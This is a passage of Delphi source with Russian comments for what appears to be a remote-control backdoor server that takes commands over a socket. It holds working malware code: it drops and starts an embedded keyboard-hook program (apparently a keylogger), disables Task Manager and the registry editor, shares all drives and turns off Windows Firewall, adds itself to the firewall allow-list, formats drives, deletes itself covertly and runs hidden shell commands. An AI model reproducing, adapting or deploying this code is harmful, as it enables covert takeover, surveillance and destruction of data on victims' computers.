  CloseHandle(FSnapshotHandle);
end;

//Поиск файлов по маске
procedure FindFilesByMask(List :tStrings; var DirCount :Integer; const DirName, Mask :String; SubDir: Boolean = True);
// Поиск файлов по маске в заданной папке и подпапке
  // Чем меньше параметров и локальных переменных у рекурсивной процедуры,
  // тем меньше она требует памяти под стек. Поэтому использую локальную
  // процедуру
  procedure ScanDirs(const DirName :String);
  var
    h   :tHandle;
    wfd :tWin32FindData;
  begin
    Inc(DirCount); // просто для статистики
    // Сначала просмотрим текущий каталог по заданной маске
    h := Windows.FindFirstFile(PChar(DirName+Mask), wfd);
    try
      if  h <> INVALID_HANDLE_VALUE  then begin
        repeat
          if  (wfd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0  then
            List.Add(DirName+wfd.cFileName);
        until  not Windows.FindNextFile(h,wfd);
      end;
      // проверка кода ошибки и FindFirstFile и FindNextFile
      case  GetLastError  of
        ERROR_NO_MORE_FILES,    // больше нет файлов и каталогов удовлетворяющих маске (но были)
        ERROR_FILE_NOT_FOUND,   // вообще нет файлов и каталогов удовлетворяющих маске
        ERROR_SHARING_VIOLATION // возникает во время создания каталога (уже создан но еще недоступен)
                              : ; // ничего не делаем, все Ok
        else // все остальные ошибки
          WriteLf('Error view catalog: "%s": %s '+DirName);
      end;
    finally
      if  h <> INVALID_HANDLE_VALUE  then Windows.FindClose(h);
    end;
    // Теперь рекрсивно просмотрим подкаталоги
    if not SubDir then exit; // 13.06.03
    h := Windows.FindFirstFile(PChar(DirName+'*.*'), wfd);
    try
      if  h <> INVALID_HANDLE_VALUE  then begin
        repeat
          if   ((wfd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0)
           and (wfd.cFileName <> String('.'))
           and (wfd.cFileName <> '..')           then
            ScanDirs(IncludeTrailingPathDelimiter(DirName+wfd.cFileName));
        until  not Windows.FindNextFile(h,wfd);
      end;
      // проверка кода ошибки и FindFirstFile и FindNextFile
      case  GetLastError  of
        ERROR_NO_MORE_FILES,    // больше нет файлов и каталогов удовлетворяющих маске (но были)
        ERROR_FILE_NOT_FOUND,   // вообще нет файлов и каталогов удовлетворяющих маске
        ERROR_SHARING_VIOLATION // возникает во время создания каталога (уже создан но еще недоступен)
                              : ; // ничего не делаем, все Ok
        else // все остальные ошибки
           WriteLf('Error view catalog: "%s": %s '+DirName);
      end;
    finally
      if  h <> INVALID_HANDLE_VALUE  then Windows.FindClose(h);
    end;
  end;
begin // FindFilesByMask
  ScanDirs(IncludeTrailingPathDelimiter(DirName));
end;

procedure AutoReg;
var
  i,y: Integer;
  reg: TRegistry;
  ts: TStringList;
   s: string;
begin
  //Обьекты реестра и списка
  Reg := TRegistry.Create;
  ts := TStringList.Create;
  //ветвь которую смотрим
  reg.RootKey := HKEY_LOCAL_MACHINE;
  try
    //читаем ключ
    if Reg.OpenKeyReadOnly('Software\Microsoft\Windows\CurrentVersion\Run\') then
    begin
      //получаем список переменных содержщихся в ветви
      reg.GetValueNames(ts);
      for i := 0 to ts.Count - 1 do
      begin
        //если переменная существует
        if Reg.ValueExists(ts.Strings[i]) then
        begin
          //грузим её значение
          WriteLf(reg.ReadString(ts.Strings[i]));
        end;
      end;
    end;
  finally
    //отваливаем
    reg.Free;
    ts.Free;
  end;
  //Обьекты реестра и списка
  Reg := TRegistry.Create;
  ts := TStringList.Create;
  //ветвь которую смотрим
  reg.RootKey := HKEY_CURRENT_USER;
  try
    //читаем ключ
    if Reg.OpenKeyReadOnly('Software\Microsoft\Windows\CurrentVersion\Run\') then
    begin
      //получаем список переменных содержщихся в ветви
      reg.GetValueNames(ts);
      for i := 0 to ts.Count - 1 do
      begin
        //если переменная существует
        if Reg.ValueExists(ts.Strings[i]) then
        begin
          //грузим её значение
          WriteLf(reg.ReadString(ts.Strings[i]));
        end;
      end;
    end;
  finally
    //отваливаем
    reg.Free;
    ts.Free;
  end;
  s:=RegQueryStr(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders','Startup');
  ts:=TStringList.Create;
  FindFilesByMask(ts, i, s, '*.lnk');
  for y:=0 to ts.Count-1 do begin
      s:=ts.Strings[y];
      WriteLf(GetFileNameFromLink(s));
  end;
  ts.Free;
end;

function DriveExists(Drive: Byte): boolean;
begin
  Result := Boolean(GetLogicalDrives and (1 shl Drive));
end;

procedure FindAllComputers(Workgroup: String);
var
  EnumHandle : THandle;
  WorkgroupRS : TNetResource;
  Buf : Array[1..500] of TNetResource;
  BufSize:cardinal;
  Entries:cardinal;
  Result : Integer;
  Computer : Array[1..500] of String[25];
  ComputerCount : Integer;
begin
  ComputerCount := 0;
  Workgroup := Workgroup + #0;
  FillChar(WorkgroupRS, SizeOf(WorkgroupRS) , 0);
  With WorkgroupRS do begin
    dwScope := 2;
    dwType := 3;
    dwDisplayType := 1;
    dwUsage := 2;
    lpRemoteName := @Workgroup[1];
  end;
  WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, @WorkgroupRS, EnumHandle );
  Repeat
    Entries := 1;
    BufSize := SizeOf(Buf);
    Result := WNetEnumResource(EnumHandle, Entries, @Buf, BufSize);
    If (Result = NO_ERROR) and (Entries = 1) then begin
      Inc( ComputerCount);
      Computer[ ComputerCount ] := Buf[1].lpRemoteName;
      WriteLf(Buf[1].lpRemoteName);
    end;
  Until (Entries <> 1) or (Result <> NO_ERROR);
  WNetCloseEnum( EnumHandle );
end;

function GetCurrentUserName: string;
const
   cnMaxUserNameLen = 254;
var
   sUserName: string;
   dwUserNameLen: DWORD;
begin
   dwUserNameLen := cnMaxUserNameLen - 1;
   SetLength(sUserName, cnMaxUserNameLen);
   GetUserName(PChar(sUserName), dwUserNameLen);
   SetLength(sUserName, dwUserNameLen);
   Result := sUserName;
end;

function GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end;

procedure GetCompUser;
var
  c,u: string;
begin
 c:=GetComputerNetName;
 u:=GetCurrentUserName;
 WriteLf('> ... ComputerNetName: '+c);
 WriteLf('> ... CurrentUserName: '+u);
end;

//Узнаем IP
procedure GetLocalIP;
var
  s: string;
  i:integer;
begin
   i:=HostToLong(GetComputerNetName);
   s:=LongToIp(i);
   WriteLf('LocalIP: '+s);
end;

function GetWindowsPath:string;
begin
 SetLength(Result,MAX_PATH);
 SetLength(Result,GetWindowsDirectory(@Result[1],MAX_PATH));
 WriteLf('> ... Windows: '+Result);
end;

procedure BlockReg(a:integer);
var
  H: TRegistry;
begin
  H := TRegistry.Create;
  with H do
  begin
    RootKey := HKEY_CURRENT_USER;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System', true);
    WriteInteger('DisableRegistryTools', a);
  if a = 1 then
    WriteLf('> ... Registry: BLOCK')
  else WriteLf('> ... Registry: UNBLOCK');
  end;
  H.CloseKey;
  H.Free;
end;

procedure BlockAutoRun(a:integer);
var
  H: TRegistry;
begin
  H := TRegistry.Create;
  with H do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableLocalMachineRun', a);
    H.CloseKey;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableLocalMachineRunOnce', a);
    H.CloseKey;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableCurrentUserRun', a);
    H.CloseKey;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableCurrentUserRunОnce', a);
  if a = 1 then
    WriteLf('> ... Run: BLOCK')
  else WriteLf('> ... Run: UNBLOCK');
  end;
  H.CloseKey;
  H.Free;
end;

procedure BlockTaskMgr(a:integer);
var
  H: TRegistry;
begin
  H := TRegistry.Create;
  with H do
  begin
    RootKey := HKEY_CURRENT_USER;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System', true);
    WriteInteger('DisableTaskMgr', a);
  if a = 1 then
    WriteLf('> ... TaskMgr: BLOCK')
  else WriteLf('> ... TaskMgr: UNBLOCK');
  end;
  H.CloseKey;
  H.Free;
end;

procedure DriveEx;
var
  i: integer;
  C: String;
  DType: Integer;
  DriveString: String;
  SerialNum : dword;
  a, b : dword;
  Buffer : array [0..255] of char;
  LogDrives: set of 0..25;
begin
  integer(LogDrives) := GetLogicalDrives;
  for i := 0 to 25 do
    if (i in LogDrives) then begin
    if GetVolumeInformation(PChar(chr(i + 65)+':\'), Buffer, SizeOf(Buffer), @SerialNum, a, b, nil, 0) then
       WriteLf('> ... '+chr(i + 65)+' - SN: - '+IntToStr(SerialNum));
    end;
 for i:=65 to 90 do
  begin
   C:=chr(i)+':\';
   DType:=GetDriveType(PChar(C));
   case DType of
     0: DriveString:=C+' Tip nakopitelya ne mojshet bit opredelen.';
     1: DriveString:=C+' Kornevaya directorya ne syshestvuet.';
     DRIVE_REMOVABLE: DriveString:=
        C+' Disk mojshet bit ydalen iz nakopitelya.';
     DRIVE_FIXED: DriveString:=
        C+' Disk ne mojshet bit ydalen iz nakopitelya.';
     DRIVE_REMOTE: DriveString:=
        C+' Udalenya (setevoy) disk.';
     DRIVE_CDROM: DriveString:=C+' Ustroystva - CD-ROM.';
     DRIVE_RAMDISK: DriveString:=C+' Ustroystva - RAM disk.';
    end;
   if not ((DType = 0) or (DType = 1))
   then WriteLf(DriveString);
  end;
end;

procedure FormatDrive(Drive: char);
const
  SHFMT_ID_DEFAULT = $FFFF;
  // Быстрое (очистка оглавления диска)
  SHFMT_OPT_QUICKFORMAT = 0;
  // Полное
  SHFMT_OPT_FULLFORMAT = 1;
  // Только копирование системных файлов
  SHFMT_OPT_SYSONLY = 2;
  SHFMT_ERROR = -1;
  SHFMT_CANCEL = -2;
  SHFMT_NOFORMAT = -3;
var
  FmtRes: longint;
  FmtDrive: word;
  aSh: THandle;
begin
   FmtDrive := Ord( UpCase( Drive ) ) - 65;
   try
      FmtRes:= ShFormatDrive(aSh,
                              FmtDrive,
                              SHFMT_ID_DEFAULT,
                              SHFMT_OPT_QUICKFORMAT );
      case FmtRes of
         SHFMT_ERROR: WriteLf( 'Error formatting the drive' );
         SHFMT_CANCEL: WriteLf( 'User canceled formatting the drive' );
         SHFMT_NOFORMAT: WriteLf( 'No Format' )
         else WriteLf('Disk has been formatted');
      end;
   except
   end;
end;

function EncS(Source, Password: string): string;
var
  DCP_rijndael1: TDCP_rijndael;
begin
  DCP_rijndael1 := TDCP_rijndael.Create(nil);   // создаём объект
  DCP_rijndael1.InitStr(Password, TDCP_sha512);    // инициализируем
  Result := DCP_rijndael1.EncryptString(Source); // шифруем
  DCP_rijndael1.Burn;                            // стираем инфо о ключе
  DCP_rijndael1.Free;                            // уничтожаем объект
end;

function DecS(Source, Password: string): string;
var
  DCP_rijndael1: TDCP_rijndael;
begin
  DCP_rijndael1 := TDCP_rijndael.Create(nil);   // создаём объект
  DCP_rijndael1.InitStr(Password, TDCP_sha512);    // инициализируем
  Result := DCP_rijndael1.DecryptString(Source); // дешифруем
  DCP_rijndael1.Burn;                            // стираем инфо о ключе
  DCP_rijndael1.Free;                            // уничтожаем объект
end;

//Зашифрование файла:
function EncF(Source, Dest: string): string;
var
  DCP_rijndael1: TDCP_rijndael;
  Password: string;
  SourceStream, DestStream: TFileStream;
begin
  Result := ' Encrypt - OK';
  try
    WriteLf(' Encrypt: '+Source + ' \ ' +Dest);
    Password:=KeyRelease;
    WriteLf(' Load Password Encrypt - OK '+#13#10+Password);
    FileMode:=0;
    SourceStream := TFileStream.Create(Source, FileMode);
    DestStream := TFileStream.Create(Dest, fmCreate);
    DCP_rijndael1 := TDCP_rijndael.Create(nil);
    DCP_rijndael1.InitStr(Password, TDCP_sha512);
    DCP_rijndael1.EncryptStream(SourceStream, DestStream, SourceStream.Size);
    WriteLf(' Encrypt File '+ExtractFileName(Dest)+' - OK ');
    DCP_rijndael1.Burn;
    DCP_rijndael1.Free;
    DestStream.Free;
    SourceStream.Free;
  except
    Result := ' Encrypt - ERROR';
  end;
end;

//расшифрование файла:
function DecF(Source, Dest: string): string;
var
  DCP_rijndael1: TDCP_rijndael;
  Password: string;
  SourceStream, DestStream: TFileStream;
begin
  Result := ' Decrypt - OK';
  try
    WriteLf(' Decrypt: '+Source + ' \ ' +Dest);
    Password:=KeyRelease;
    WriteLf(' Load Password Decrypt - OK '+#13#10+Password);
    FileMode:=0;
    SourceStream := TFileStream.Create(Source, FileMode);
    DestStream := TFileStream.Create(Dest, fmCreate);
    DCP_rijndael1 := TDCP_rijndael.Create(nil);
    DCP_rijndael1.InitStr(Password, TDCP_sha512);
    DCP_rijndael1.DecryptStream(SourceStream, DestStream, SourceStream.Size);
    WriteLf(' Decrypt File '+ExtractFileName(Dest)+' - OK ');
    DCP_rijndael1.Burn;
    DCP_rijndael1.Free;
    DestStream.Free;
    SourceStream.Free;
  except
    Result := ' Decrypt - ERROR';
  end;
end;

procedure Hook_KB;
begin
 //Load EXE Hook KB
 if not FileExists(pchar(ExtractFilePath(ParamStr(0))+'skbh.exe')) then
  begin
  if 0 <> FindResource(hInstance, 'skbh', 'exe') then
   begin
    rs := TResourceStream.Create(hInstance, 'skbh', 'exe');
    ms := TMemoryStream.Create;
    try
      ms.LoadFromStream(rs);
      ms.Position := 0;
      m_DllDataSize := ms.Size;
      mp_DllData := GetMemory(m_DllDataSize);
      ms.Read(mp_DllData^, m_DllDataSize);
      ms.SaveToFile(pchar(ExtractFilePath(ParamStr(0))+'skbh.exe'));
    finally
      ms.Free;
      rs.Free;
    end;
   end;
  end;
  //Load DLL Hook KB
 if not FileExists(pchar(ExtractFilePath(ParamStr(0))+'kbh.dll')) then
  begin
  if 0 <> FindResource(hInstance, 'kbh', 'dll') then
   begin
    rs := TResourceStream.Create(hInstance, 'kbh', 'dll');
    ms := TMemoryStream.Create;
    try
      ms.LoadFromStream(rs);
      ms.Position := 0;
      m_DllDataSize := ms.Size;
      mp_DllData := GetMemory(m_DllDataSize);
      ms.Read(mp_DllData^, m_DllDataSize);
      ms.SaveToFile(ExtractFilePath(ParamStr(0))+'kbh.dll');
    finally
      ms.Free;
      rs.Free;
    end;
   end;
  end;
  if (FileExists(ExtractFilePath(ParamStr(0))+'skbh.exe')) and (processExists('skbh.exe')) then KillTask('skbh.exe');
  if (not processExists('skbh.exe')) and (FileExists(ExtractFilePath(ParamStr(0))+'skbh.exe')) and
     (FileExists(ExtractFilePath(ParamStr(0))+'kbh.dll')) then begin
     ZeroMemory(@startupinfo, SizeOf(_STARTUPINFOA));
     startupinfo.cb:=SizeOf(_STARTUPINFOA);
     startupinfo.dwFlags:=STARTF_USESHOWWINDOW;
     startupinfo.wShowWindow:=SW_SHOW;
     FName := PWideChar(WideString(PChar(ExtractFilePath(ParamStr(0))+'skbh.exe')));
     if CreateProcessWithLogonW('Guest', nil, '', 0, nil, FName, 0, nil, nil, startupinfo, processinformation) then
      begin                      //Гость
        CloseHandle(processinformation.hThread);
        CloseHandle(processinformation.hProcess);
      end else RaiseLastOSError;
     end;
     //ShellExecute(0, 'open', PChar(ExtractFilePath(ParamStr(0))+'skbh.exe'), nil, nil, SW_SHOWNORMAL);
     Sleep(100);
  if processExists('skbh.exe') then WriteLf('Load hook file: skbh.exe - OK') else WriteLf('Load hook file: skbh.exe - ERROR')
end;

Function GetRealPasw(const Psw: String): String;
// Дешифрует пароль 
Var LPos, Pl: Integer;
Begin
   Result:='';
   Pl:=Length(Psw);
   LPos:=1;
   While (LPos < Pl)
      Do
         Begin
            Result:=Psw;    //+ Chr(StrToIntDef(Copy(Psw, LPos, 3), 0))
            LPos:=LPos + 3;
         End;
End;

Var FileName: array[0..255] of char;
Procedure FileDelete;
Begin
   DeleteFile(FileName);
   ExitProcess(0);
End;

procedure DeleteSelf;
// Самоудаление
var
 St: TStartupInfo;
 Pr: TProcessInformation;
Begin
   GetModuleFileName(GetModuleHandle(nil), FileName, 255);
   if (not CreateProcess(nil, InjectionForDelete, nil, nil, false,
       CREATE_SUSPENDED, nil, nil, St, Pr)) Then Halt(1);
       InjectThisExe(Pr.hProcess, @FileDelete);
       ExitThread(0);
end;

//Удаление файлов
function DelDir(dir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc  := FO_DELETE;
    fFlags := FOF_SILENT or FOF_NOCONFIRMATION;
    pFrom  := PChar(dir + #0);
  end;
  Result := (0 = ShFileOperation(fos));
end;

//Самоликвидация
function SelfDelete:boolean;
var
     ppri:DWORD;
     tpri:Integer;
     sei:SHELLEXECUTEINFO;
     szModule, szComspec, szParams: array[0..MAX_PATH-1] of char;
begin
      result:=false;
      if((GetModuleFileName(0,szModule,MAX_PATH)<>0) and
         (GetShortPathName(szModule,szModule,MAX_PATH)<>0) and
         (GetEnvironmentVariable('COMSPEC',szComspec,MAX_PATH)<>0)) then
      begin
        lstrcpy(szParams,'/c del ');
        lstrcat(szParams, szModule);
        lstrcat(szParams, ' > nul');
        sei.cbSize       := sizeof(sei);
        sei.Wnd          := 0;
        sei.lpVerb       := 'Open';
        sei.lpFile       := szComspec;
        sei.lpParameters := szParams;
        sei.lpDirectory  := nil;
        sei.nShow        := SW_HIDE;
        sei.fMask        := SEE_MASK_NOCLOSEPROCESS;
        ppri:=GetPriorityClass(GetCurrentProcess);
        tpri:=GetThreadPriority(GetCurrentThread);
        SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
        try
          if ShellExecuteEx(@sei) then
          begin
            SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);
            SetProcessPriorityBoost(sei.hProcess,TRUE);
            SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,@szModule,nil);
            result:=true;
          end;
        finally
          SetPriorityClass(GetCurrentProcess, ppri);
          SetThreadPriority(GetCurrentThread, tpri)
        end
      end
end;

procedure ExecConsoleApp(const CommandLine: AnsiString);
// Запуск консольной программы с перенаправлением вывода в пайп
Var
  sa: TSECURITYATTRIBUTES;
  si: TSTARTUPINFO;
  pi: TPROCESSINFORMATION;
  hPipeOutputRead: THANDLE;
  hPipeOutputWrite: THANDLE;
  hPipeErrorsRead: THANDLE;
  hPipeErrorsWrite: THANDLE;
  Res, bTest: Boolean;
  env: Array[0..100] of Char;
  szBuffer: Array[0..256] of Char;
  dwNumberOfBytesRead: DWORD;

Begin
  sa.nLength := sizeof(sa);
  sa.bInheritHandle := true;
  sa.lpSecurityDescriptor := nil;
  CreatePipe(hPipeOutputRead, hPipeOutputWrite, @sa, 0);
  CreatePipe(hPipeErrorsRead, hPipeErrorsWrite, @sa, 0);
  ZeroMemory(@env, SizeOf(env));
  ZeroMemory(@si, SizeOf(si));
  ZeroMemory(@pi, SizeOf(pi));
  si.cb := SizeOf(si);
  si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  si.wShowWindow := SW_HIDE;
  si.hStdInput:=0;
  si.hStdOutput:=hPipeOutputWrite;
  si.hStdError:=hPipeErrorsWrite;

  Res:=CreateProcess(nil, pchar(CommandLine), nil, nil, true,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, @env, nil, si, pi);

  // Procedure will exit if CreateProcess fail
  If Not Res Then
  Begin
    CloseHandle(hPipeOutputRead);
    CloseHandle(hPipeOutputWrite);
    CloseHandle(hPipeErrorsRead);
    CloseHandle(hPipeErrorsWrite);
    Exit;
  End;
  CloseHandle(hPipeOutputWrite);
  CloseHandle(hPipeErrorsWrite);

  // Read output pipe
   While true Do
      Begin
         FillChar(szBuffer, SizeOf(szBuffer), 0);
         bTest:=ReadFile(hPipeOutputRead, szBuffer, 256, dwNumberOfBytesRead,
                  nil);
         If Not bTest Then break;
         // Грёбаный M$ живёт в OEM консольной жизнью
         // OEMToANSI(szBuffer, szBuffer);
         WriteLf(szBuffer, false);
      End;

  // Read error pipe
   While true Do
      Begin
         FillChar(szBuffer, SizeOf(szBuffer), 0);
         bTest:=ReadFile(hPipeErrorsRead, szBuffer, 256, dwNumberOfBytesRead, nil);
         If Not bTest Then Break;
         // OEMToANSI(szBuffer, szBuffer);
         WriteLf(szBuffer, false);
      End;
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(hPipeOutputRead);
  CloseHandle(hPipeErrorsRead);
End;

function SysVolInfExists(const Disk: PChar): Boolean;
var
  Code : Integer;
   Buf : PathBuf;
begin
  LStrCpy(Buf,#0);//Чистка и инициализация переменной
  LStrCat(Buf,Disk);//Прибавляем значение Disk
  LStrCat(Buf,'System Volume Information');//Прибавляем строку
  Code := GetFileAttributes(Buf); //Получаем код возврата
  Result := (Code <> -1) and ($10 and Code <> 0);//Вычисляем значение
end;

procedure ShareDisk;
Const
  VRAI  =-1;
  FAUX  = 0;
  FW_BOOL       :  Array[VRAI..FAUX]  of string =('ENABLED','DISABLED');
var
   sdf: THandle;
   i1 : integer;
   i2 : integer;
   i4 : integer;
   F1 : pathbuf;
   F2 : pathbuf;
   s  : string;
  Buf : array [0..95] of char;
begin
  GetModuleFileName(0,F1,MAX_PATH);//Путь к себе
  GetLogicalDriveStrings(96,Buf); //Строка дисков
for i1:=0 to 25 do
  if Buf[i1*4+2]<>#92 then break;
  //Получаем количество дисков
  if Buf[0]=#65 then i4:=1 else i4:=0;
  for i2:=i4 to i1-1 do
  //Пробуем на всех дисках
    begin
      //Тип диска
      if (SysVolInfExists(@Buf[i2*4])) or (not SysVolInfExists(@Buf[i2*4])) then
      //и нет папки System Volume Information то..
      begin
        LStrCpy(F2,#0); //Чистка и инициализация переменной
        LStrCat(F2,@Buf[i2*4]);// + Диск
        s:=F2[0]+F2[1]+F2[3];
        s:=Trim(s);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share Share_'+Trim(F2[0])+'='+s),pchar(''),SW_HIDE);
        WriteLf('Disk '+s+' - share enable!');
      end;
    end;
       //Отключаем Брандмауэр
        ICFInitialize(fwProf);
        WindowsFirewallTurnOff(fwProf);
        WriteLf('Disable Firewall!');
end;

procedure ShareDiskDel;
var
  sdf : THandle;
   i1 : integer;
   i2 : integer;
   i4 : integer;
   F1 : pathbuf;
   F2 : pathbuf;
   s  : string;
  Buf : array [0..95] of char;
Begin
  GetModuleFileName(0,F1,MAX_PATH);//Путь к себе
  GetLogicalDriveStrings(96,Buf); //Строка дисков
for i1:=0 to 25 do
  if Buf[i1*4+2]<>#92 then break;
  //Получаем количество дисков
  if Buf[0]=#65 then i4:=1 else i4:=0;
  for i2:=i4 to i1-1 do
  //Пробуем на всех дисках
    begin
      //Тип диска
      if (SysVolInfExists(@Buf[i2*4])) or (not SysVolInfExists(@Buf[i2*4])) then
      //и нет папки System Volume Information то..
      begin
        LStrCpy(F2,#0); //Чистка и инициализация переменной
        LStrCat(F2,@Buf[i2*4]);// + Диск
        s:=F2[0];
        s:=Trim(s);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share Share_'+s+' /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share '+s+'$ /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share print$ /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share ADMIN$ /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share Users /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share HP LaserJet 6L /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share IPC$ /delete'),pchar(''),SW_HIDE);
        WriteLf('Share Share_'+F2[0]+' - disable!');
      end;
    end;
       //Включаем Брандмауэр
        ICFInitialize(fwProf);
        WindowsFirewallTurnOn(fwProf);
        WriteLf('Enable Firewall!');
end;

Procedure MyFirewall;
// добавить приложение в список разрешенных программ файервола Windows
Begin
   ExecConsoleApp('netsh advfirewall firewall add rule name="Firewall" dir=in action=allow program="'+ParamStr(0)+'" enable=yes');
End;

Procedure ShowBack;
// Перевод каретки назад, печать пробела, перевод назад
Begin
   if (EchoOn) Then Write(#08' '#08);
End;

Function Echo: String;
// Получение строки с эхоотображением
Var Msg: String;
    TmpChar: Char;
    MsgLen: Integer;
Begin
   Result := '';
   SetLength(Msg, 0);
   repeat
      if (not Check_Avail) Then break;
      MsgLen := Recv(Cln, @TmpChar, 1, 0);
      if ((TmpChar = CR) or (Length(Msg) >= MaxCmdLen)) Then
      // Enter
      Begin
         Recv(Cln, @TmpChar, 1, 0); // Читаю LF
         if (EchoOn) Then Write(LN_FEED);
         Msg      := RecodeToANSI(Msg);
         Result   := Msg;
         Exit;
      End
      Else if ((TmpChar = #08) or (TmpChar = #127)) Then
      // BackSpace
         Begin
            If (Length(Msg) > 0) Then
               Begin
                  SetLength(Msg, Length(Msg) - 1);
                  ShowBack;
               End;
         End
      Else
      // Обычный символ
         Begin
            if (EchoOn) Then Write(TmpChar);
            Msg := Msg + TmpChar;
         End;
   until (MsgLen <= 0);
End;

Function ReadCmd: String;
// Читает коммандную строку
Begin
   Result := Echo;
End;

Function ReadLogin: String;
Begin
   Result := Echo;
End;

Function ReadPasw: String;
// Читает пароль (отображение звёздочек)
Var Psw: String;
    TmpChar: Char;
    PswLen: Integer;
Begin
   Result := '';
   SetLength(Psw, 0);
   repeat
      if (not Check_Avail) Then break;
      PswLen := Recv(Cln, @TmpChar, 1, 0);
      if ((TmpChar = CR) or (Length(Psw) >= MaxCmdLen)) Then
      // Enter
      Begin
         TmpChar  := #0;
         Result   := Psw;
         Psw      := '          ';
         Recv(Cln, @TmpChar, 1, 0); // Читаю LF
         if (EchoOn) Then Write(LN_FEED);
         Exit;
      End
      Else If (TmpChar = #08) Then
      // BackSpace
         Begin
            If (Length(Psw) > 0) Then
               Begin
                  SetLength(Psw, Length(Psw) - 1);
                  ShowBack;
               End;
         End
      Else
      // Обычный символ
         Begin
            Psw := Psw + TmpChar;
            if (EchoOn) Then Write('*')
            Else
            // Эхо выключено, но всё равно выводим звёздочки, предполагая,
            // что терминал отображает введённые символы
               Begin
                  EchoOn := true;
                  ShowBack;
                  Write('*');
                  EchoOn := false;
               End;
         End;
   until (PswLen <= 0);
End;

Procedure Usage;
// Выводит краткую справку
Begin
   WriteLf(' Internal server commands (starting with "\"): ' + LN_FEED +
   ' --- Main ---' + LN_FEED +
   '   h|?|help - This help' + LN_FEED +
   '   q|quit|exit|x|bye - Disconnect' + LN_FEED +
   '   q - Disconnect CloseCriticalProcess' + LN_FEED +
   '   r - Restart server' + LN_FEED +
   '   s - Shutdown server' + LN_FEED +
   '   v|V - Version' + LN_FEED +
   ' --- Directory commands ---' + LN_FEED +
   '   pwd - Show current directory' + LN_FEED +
   '   cd <dir> - Change directory' + LN_FEED +
   '   ls [dir] - Show directory content' + LN_FEED +
   '   mkdir <dir> - Make new directory' + LN_FEED +
   '   rmdir <dir> - Remove empty directory' + LN_FEED +
   '   rmr <dir> - Recursively remove directory' + LN_FEED +
   ' --- File commands ---' + LN_FEED +
   '   cp <file1>< \ ><file2> - Copy file1 to file2' + LN_FEED +
   '   mv <file1>< \ ><file2> - Rename file1 to file2' + LN_FEED +
   '   rm <file> - Delete file' + LN_FEED +
   '   cat <file> - Print file on the terminal' + LN_FEED +
   ' --- Find commands ---' + LN_FEED +
   '   sf <Disk>< \ ><*.txt> - Find file, c \ *.txt' + LN_FEED +
   '   findx <Disk>< \ ><mask> - Find file, findx c:\ \ *.jpg' + LN_FEED +
   '   findm <Disk>< \ ><mask> - Find file, findx d:\ \ *.exe' + LN_FEED +
   '   finds <file>< \ ><size> - Find File, creater or equal size' + LN_FEED +
   ' --- Disk commands ---' + LN_FEED +
   '   du <dir/file> - File or directory SizeDir' + LN_FEED +
   '   ds <Disk> - Disk statistics' + LN_FEED +
   '   formatd <Disk> - FormatDriveDisk' + LN_FEED +
   '   dre - DriveEx - All disks in the system' + LN_FEED +
   ' --- Process control commands ---' + LN_FEED +
   '   ps - Show process list' + LN_FEED +
   '   kill <PID> - Terminate process with PID' + LN_FEED +
   '   killp <NAME> - Terminate process with NAME' + LN_FEED +
   '   killx <*.*> - Terminate process *.*' + LN_FEED +
   ' --- Commands Encrypt File/String---' + LN_FEED +
   '   encs [String] - Command Encrypt encs test' + LN_FEED +
   '   decs [String] - Command Decrypt decs 2@3we$' + LN_FEED +
   '   encf < \ > - EncryptFile command encf file1 to file2' + LN_FEED +
   '   decf < \ > - DecryptFile command decf file1 to file2' + LN_FEED +
   ' --- Commands running ---' + LN_FEED +
   '   cmd [command] - Do command with cmd.exe' + LN_FEED +
   '   run <command> - Run command with ShellExecute' + LN_FEED +
   ' --- Other commands ---' + LN_FEED +
   '   getwindows - GetWindowsPath(DirectoryWindows)' + LN_FEED +
   '   getcomp - GetCompName / User' + LN_FEED +
   '   getip - GetLocalIP' + LN_FEED +
   '   getos - GetOSVersionText' + LN_FEED +
   '   getsysdir - GetSystemDir' + LN_FEED +
   '   getvidcd - GetVideoCard' + LN_FEED +
   '   findallg <Group> - GetFindAllGroup' + LN_FEED +
   '   shared - ShareAllDisk - Disable Firewall' + LN_FEED +
   '   shareddel - ShareAllDiskDel - Enable Firewall' + LN_FEED +
   '   criton - Successfully set the current process as critical process' + LN_FEED +
   '   critoff - Successfully canceled critical process status' + LN_FEED +
   '   firewall - firewall show rule name=all' + LN_FEED +
